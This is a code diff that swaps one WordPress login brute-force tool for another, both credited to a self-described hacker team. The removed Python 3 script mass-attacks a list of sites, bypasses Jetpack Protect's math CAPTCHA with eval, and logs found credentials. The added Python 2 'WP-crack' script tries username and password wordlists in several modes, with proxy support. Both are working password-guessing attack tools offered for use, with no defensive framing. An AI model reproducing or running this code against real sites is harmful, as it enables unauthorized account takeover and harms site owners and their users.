@@ -1,105 +1,243 @@
-# -*- coding: utf8 -*-
-#Ya Maap codingan we berantakan :'v,jangan di recode ya KONTOL.
-
-import requests,readline,re,os,random
-from urllib.request import urlsplit
-requests = requests.Session()
-
-h = '\033[92m'
-p = '\033[97m'
-m = '\033[91m'
-br = '\033[94m'
-ua = open('ua.txt','rb').read().decode('utf8').splitlines()
-
-
-__banner__ = ('''%s''')
-      ^__^
-      (%soo%s)\_______
-      (__)\       )={%sD704T Team%s}
-          ||----w |
-          ||     ||
-          oo     oo
-
-%s[+]%s WordPress Massal Brute Force..
-%s[+]%s Code: Jay Hutajulu a.k.a ./BarBarKing
-%s[+]%s Team: D704T HackerTeam Ft MedanHackingRulez % (p,m,p,h,p,h,p,h,p,h,p))
-''')
-class Main():
-    def __init__(self):
-        os.system('clear')
-        print(__banner__)
-        self.v = 0
-        self.sendu()
-        self.u_p()
-        self.crack()
-
-    def sendu(self):
-        try:
-            print('\n%s[info]%s Masukkan File list site nya.!!' % (h,p))
-            f = str(input('%s[info] %slist site: ' % (h,p)))
-            self.site = open(f,'rb').read().decode('utf8').splitlines()
-        except Exception as _er:
-            quit('%s[info]%s%s' % (m,p,_er))
-
-    def u_p(self):
-        try:
-            print('%s[info]%s Masukkan WordList' % (h,p))
-            us = str(input('%s[info]%s list user: ' % (br,p)))
-            pw = str(input('%s[info]%s list pasw: ' % (br,p)))
-            self.a = open(us,'rb').read().decode('latin').splitlines()
-            self.b = open(pw,'rb').read().decode('latin').splitlines()
-        except Exception as _er:
-            quit('%s[info]%s%s' % (m,p,_er))
-
-    def crack(self):
-        print('%s[info]%s total site: %d' % (h,p,len(self.site)))
-        print('%s[info]%s total wordlist u/p: %d' % (h,p,min([len(self.a),len(self.b)])))
-        for site in self.site:
-                requests.headers.update({'user-agent':random.choice(ua)})
-                parse = urlsplit(site)
-                netloc = parse.netloc
-                scheme = parse.scheme
-                print('%s[info]%s cracking: %s' % (br,p,netloc))
-                for a,b in zip(self.a,self.b):
-                    try:
-                        data = {}
-                        url = '%s://%s/wp-login.php' % (scheme,netloc)
-                        cek = requests.get(url)
-                        if cek.status_code != 200:
-                           print('%s[info]%s path wp-login not found ' % (m,p))
-                           continue
-                        for c,d in re.findall(r'name="(.*?)".*?value="(.*?)"',cek.text):
-                           data.update({c:d})
-                        if 'jetpack_protect_num' in cek.text.lower():
-                            info = re.findall(r'\n\t\t\t\t\t(.*?)=.*?\t\t\t\t',cek.text)[0].split(' ')
-                            iok = (''.join(info)).replace('x','*').replace('&nbsp;','')
-                            value = str(eval(iok))
-                            print('%s[info]%s user agent di curigai' % (m,p))
-                            print('%s[info]%s bypassin chapta :"v %s = %s%s'  % (m,p,iok,h,value))
-                            data.update({'jetpack_protect_num':value})
-                        else:
-                            pass
-                        data.update({'log':a,'pwd':b})
-                        req = requests.post(url,
-                            data = data
-                            ).text.lower()
-                        if 'dashboard' in req:
-                            self.v += 1
-                            print('    %s~ found%s: %s > %s , %s' %(h,p,url,a,b))
-                            open('found.txt','a').write(url+'>  %s | %s \n' % (a,b))
-                            break
-                        else:
-                            print('    %s~ failed login %s%s , %s' % (m,p,a,b))
-                        continue
-                    except:
-                        print('%s[info] %sError gan ..' % (m,p))
-                        continue
-        quit('%s[%s@%s]%s selesai total %s save to found.txt' % (br,m,br,p,self.v))
-
-
-
-
-
-
-#___main___:
-Main()
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+import sys
+import urllib2, urllib
+import cookielib
+import re
+ 
+#
+#functions
+#
+ 
+def loadLst(fileName, lstName):
+    f = open(fileName, 'r')
+    for line in f:
+        lstName.append(line.replace('\r\n',''))
+    f.close()
+ 
+if len(sys.argv) <= 1:
+    print 'WP-Brute Force - a very fast log on WordPress Brute'
+    print 'Website: http://www.sainsbyte.com'
+    print 'Mail   : jay.hutajulu11@gmail.com'
+    print ''
+    print 'Syntax: python WP-crack [-u USER|-U FILE] [-p PASS|-P FILE] -h URL [OPT]'
+    print ''
+    print 'Options:'
+    print '-h URL'
+    print '-U file contain list user'
+    print '-P file contain list password'
+    print '-u username'
+    print '-p password'
+    print '-v verbose mode / show login+pass combination for each attempt'
+    print '-f continue after found login/password pair'
+    print '-g user-agent - default: "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0"'
+    print '-x use proxy | ex: 127.0.0.1:1234'
+    print ''
+    print 'Examples: python WP-crack.py -h http://test.com/wp-login.php -u admin -P password.txt'
+    sys.exit()
+ 
+print 'WP-crack (c)2019 by D704T Hacker Team - a very fast log on WordPress Cracker'
+print 'Website: http://www.sainsybte.com'
+print 'Mail   : jay.hutajulu11@gmail.com'
+ 
+#
+#define variables
+#
+ 
+print ""
+ 
+url = ''
+wordlist = ''
+username = ''
+password = ''
+passFile = ''
+userFile = ''
+signal = 'type="password"'
+count = 0
+countAcc = 0
+mode = 1
+verbose = 0
+useProxy = 0
+continues = 0
+agent = 'Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0'
+result = ""
+ 
+ 
+#
+#check argvs
+#
+for arg in sys.argv:
+    if arg == '-h':
+        url = sys.argv[count + 1]
+    elif arg == '-u':
+        username = sys.argv[count + 1]
+    elif arg == '-U':
+        userFile = sys.argv[count + 1]
+    elif arg == '-p':
+        password = sys.argv[count + 1]
+    elif arg == '-P':
+        passFile = sys.argv[count + 1]
+    elif arg == '-v':
+        verbose = 1
+    elif arg == '-s':
+        signal = sys.argv[count + 1]
+    elif arg == '-g':
+        agent = sys.argv[count + 1]
+    elif arg == '-x':
+        lstTmp = sys.argv[count+1].split(':')
+        proxyHandler = urllib2.ProxyHandler({lstTmp[0] : lstTmp[1]+':'+lstTmp[2]})
+        useProxy = 1
+    elif arg == '-f':
+        continues = 1
+    count += 1
+ 
+ 
+if (len(username)>0 and len(password)>0):
+    mode = 1 #single
+elif (len(username)>0 and len(passFile)>0):
+    mode = 2 #
+elif (len(userFile)>0 and len(password)>0):
+    mode = 3
+elif (len(userFile)>0 and len(passFile)>0):
+    mode = 4
+ 
+#
+#init opener
+#
+cookieJar = cookielib.CookieJar()
+cookieHandler = urllib2.HTTPCookieProcessor(cookieJar)
+if useProxy == 0:
+    opener = urllib2.build_opener(cookieHandler)
+else:
+    opener = urllib2.build_opener(proxyHandler,cookieHandler)
+opener.addheaders = [('User-agent', agent)]
+cookieJar.clear()
+cookieJar.clear_session_cookies()
+ 
+#
+#main
+#
+try:
+    response = opener.open(url)
+    content = response.read()
+    if mode == 1:
+        values = {'log' : username,
+                      'pwd' : password,
+                      'wp-submit' : 'Log In',
+                      'redirect_to' : '',
+                      'testcookie' : '1' }
+        data = urllib.urlencode(values)
+        print data
+        response = opener.open(url+'/', data)
+        strTmp = response.read()
+        if strTmp.find(signal) < 0:
+            countAcc += 1
+            result += "username: " + username + "   password: " + password + "\n"
+            print "Valid user--pass: " + username + " -- " + password
+            f3 = open('test.html','w')
+            f3.write(strTmp)
+            f3.close()  
+           
+   
+   
+    if mode == 2:
+        f = open(passFile,'r')
+        for line in f:            
+            password = line.strip('\n\r')
+            values = {'log' : username,
+                      'pwd' : password,
+                      'wp-submit' : 'Log In',
+                      'redirect_to' : '',
+                      'testcookie' : '1' }
+            if verbose == 1:
+                print "Trying u--p     : " + username + " -- " + password            
+            data = urllib.urlencode(values)
+            try:
+                response = opener.open(url+'/', data)
+            except urllib2.URLError, e:
+                continue
+            strTmp = response.read()
+            if strTmp.find(signal) < 0:
+                countAcc += 1
+                result += "username: " + username + "   password: " + password + "\n"
+                print "Valid user--pass: " + username + " -- " + password                
+                break;
+         
+ 
+ 
+    if mode == 3:
+        f = open(userFile,'r')
+        for line in f:
+            username = line.strip('\n\r')
+            values = {'log' : username,
+                      'pwd' : password,
+                      'wp-submit' : 'Log In',
+                      'redirect_to' : '',
+                      'testcookie' : '1' }
+            if verbose == 1:
+                print "Trying u--p     : " + username + " -- " + password
+            data = urllib.urlencode(values)
+            try:
+                response = opener.open(url+'/', data)
+            except urllib2.URLError, e:
+                continue
+            strTmp = response.read()
+            if strTmp.find(signal) < 0:
+                countAcc += 1                
+                result += "username: " + username + "   password: " + password + "\n"
+                print "Valid user--pass: " + username + " -- " + password                
+                if continues == 0:
+                    break
+                cookieJar.clear()
+                cookieJar.clear_session_cookies()
+                response = opener.open(url)
+                content = response.read()
+ 
+               
+       
+    if mode == 4:
+        f = open(userFile,'r')
+        f2 = open(passFile,'r')
+        for line in f:
+            username = line.strip('\n\r')
+            f2.seek(0)
+            for line2 in f2:
+                password = line2.strip('\n\r')
+                values = {'log' : username,
+                      'pwd' : password,
+                      'wp-submit' : 'Log In',
+                      'redirect_to' : '',
+                      'testcookie' : '1' }
+                if verbose == 1:
+                    print "Trying u--p     : " + username + " -- " + password
+                data = urllib.urlencode(values)
+                try:
+                    response = opener.open(url+'/', data)
+                except urllib2.URLError, e:
+                    continue
+                strTmp = response.read()
+                if strTmp.find(signal) < 0:
+                    countAcc += 1                    
+                    result += "username: " + username + "   password: " + password + "\n"
+                    print "Valid user--pass: " + username + " -- " + password                    
+                    if continues == 0:
+                        break;
+                    cookieJar.clear()
+                    cookieJar.clear_session_cookies()
+                    response = opener.open(url)
+                    content = response.read()
+                   
+        f.close()
+        f2.close()    
+       
+    #Finish
+    print ''      
+    print '1 target successfuly completed, '+ str(countAcc) +' valid username+password found'
+    print 'TARGER: ' + url
+    print 'RESULT:'        
+    print result
+    sys.exit()
+except urllib2.URLError, e:
+    print "\n\t[!] Session Cancelled; Error occured. Check internet settings"
+except (KeyboardInterrupt):
+    print "\n\t[!] Session cancelled"
